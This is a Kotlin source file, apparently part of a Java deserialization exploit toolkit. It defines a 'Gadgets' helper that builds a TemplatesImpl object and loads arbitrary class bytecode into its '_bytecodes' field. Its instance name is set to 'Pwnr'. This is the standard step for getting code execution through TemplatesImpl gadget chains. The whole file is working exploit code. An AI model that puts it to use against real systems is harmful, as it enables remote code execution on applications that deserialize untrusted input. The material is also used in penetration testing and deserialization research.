package com.xhstormr.app

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl
import java.io.Serializable

object Gadgets {

    fun createTemplatesImpl(clazz: Class<*>) = createTemplatesImpl(
        clazz,
        clazz<TemplatesImpl>(),
        clazz<TransformerFactoryImpl>()
    )

    fun createTemplatesImpl(
        clazz: Class<*>,
        tplClass: Class<*>,
        transFactory: Class<*>
    ) = tplClass.newInstance().apply {
        // inject class bytes into instance
        setFieldValue("_bytecodes", arrayOf(clazz.asByte(), clazz<Foo>().asByte()))
        // required to make TemplatesImpl happy
        setFieldValue("_name", "Pwnr")
        setFieldValue("_tfactory", transFactory.newInstance())
    }

    // required to make TemplatesImpl happy
    class Foo : Serializable
}
